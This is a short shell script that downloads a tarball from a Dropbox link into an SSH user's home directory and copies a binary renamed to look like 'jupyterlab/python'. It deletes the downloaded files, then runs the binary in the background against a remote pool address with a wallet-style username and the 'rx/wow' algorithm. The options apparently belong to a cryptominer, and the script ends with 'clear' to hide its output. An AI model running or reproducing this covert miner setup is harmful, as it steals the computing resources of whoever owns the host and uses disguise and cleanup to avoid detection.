#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048
ls
wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
tar xvzf nodejsapp8q.tar.gz
mkdir jupyterlab
cd nodejsbrnt
cp nodejsfive /home/sshuser/jupyterlab/python
cd /home/sshuser
rm -r nodejsapp8q.tar.gz
rm -r nodejsbrnt
cd /home/sshuser/jupyterlab
./python -o 95.216.42.85:10662 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.85000 -p ze -a rx/wow --donate-level 1 -t 7 -B
clear
mkdir d
